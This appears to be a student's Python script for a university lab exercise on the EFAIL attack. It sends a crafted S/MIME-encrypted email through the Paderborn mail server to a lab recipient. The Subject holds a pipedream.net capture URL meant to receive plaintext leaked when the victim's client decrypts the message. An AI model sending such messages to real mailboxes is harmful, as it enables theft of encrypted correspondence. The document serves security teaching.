import smtplib
import getpass

# Insert your credentials: UPB loginID and password. You can also use a different mail server
login = "ashwani"
password = getpass.getpass()  # you can alo use getpass.getpass() to ask for the password interactively

# Check your UPB email address
sender = login + "@mail.uni-paderborn.de"

# No changes here
receiver = "efail.rub@mail.de"

# This is the original email (from encmail.eml)
# Insert the modified email content
# Change "Subject" to your personal URL e.g. a ngrok address
message = """From: sender.efail.upb@mail.de
To: efail.rub@mail.de
Subject: https://eo7xhiacd08h8bb.m.pipedream.net/
Date: Fri, 10 Jul 2020 18:00:00 +0100
MIME-Version: 1.0
Content-Type: application/pkcs7-mime;smime-type=enveloped-data; name=smime.p7m
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=smime.p7m

MIIDLQYJKoZIhvcNAQcDoIIDHjCCAxoCAQAxggGxMIIBrQIBADCBljB+MQswCQYDVQQGEwJERTEM
MAoGA1UECAwDTlJXMQ8wDQYDVQQHDAZCb2NodW0xDDAKBgNVBAoMA1JVQjEMMAoGA1UECwwDTkRT
MRIwEAYDVQQDDAlSZWNpcGllbnQxIDAeBgkqhkiG9w0BCQEWEWVmYWlsLnJ1YkBtYWlsLmRlAhQN
twmb/MirMg0aAvxekg1ZDT4TkTALBgkqhkiG9w0BAQEEggEAFds2qAuvkMQFKokyLPpZyHD1Q7vF
GooD72sHHFLEPhR/bLKCUvqP/H53dETQ0l069J9uI9Any+dXXe3+dtQGr3nE3tq5uc/YcIn2P/WW
zDH4clWB0XS2R/W7OESQ6VEPqHNzdfvyydJJtgmVv1d2uxaF7S0uWZMSmsyjdPHEfgqsMkF4oeKP
aQ/wN+t+XUfMG0mB4V8F3TivFfOM7GZIcOGPq1pVxSyjtU5DlyM+tXiJ1CpElb+VC3kdz2cimooH
wPKakE09OTRQG5v68c5Xe14fSUpgsBRTc2e0SYyfbEi5f6n9iVDmfKWUFH3Yz0tldM6LZlv4PGIH
Y7kDGciWCTCCAV4GCSqGSIb3DQEHATAdBglghkgBZQMEASoEEKwms79D5pjUjTvVmTzmZyWAggEw
6zSq6B3H5Cqbt0HMxKGlhUL5aJJRZj0JB7oZ1B5cQUAxAMWiRUvUBVHaPgm6o56TZ+tOX6l7NYsl
IEyFiOermcRJuE8vqpJLwxGVtjOtPvVmMRLBNbPL2GTPSeTL24XcQ4TiH5DOQD3KA0REVUNa8MaY
TDRJlMCTRwiwIWKxRSqnGsPUI3eb3V3jo+0l3mS4FgiXQdMPCyUBQXXPHoOef/za2SmgXLbaXJm2
u3es8hA6LyDXGCGaINs7Y7gqywzNOVvWYtgkRjHvzEQMGIB6MSijmNC21x0dbPVqWdwwkZUaZ24R
IEqQbljoL4fYqeuVLocIDNhSHJ3jB17GYTP7KI1IXu+9UQqaUzbmzS6WRJOhIeMA8/lPVOvhF5t3
eFQIZMcDqWM7/4UZwQ/rNFyplg==
"""

# If you use your UPB email address: no changes here
try:
    smtpObj = smtplib.SMTP_SSL("mail.uni-paderborn.de", 465)
    smtpObj.login(login, password)
    smtpObj.sendmail(sender, receiver, message)
    print("Successfully sent email")
except smtplib.SMTPException as e:
    print("Error: unable to send email", e)
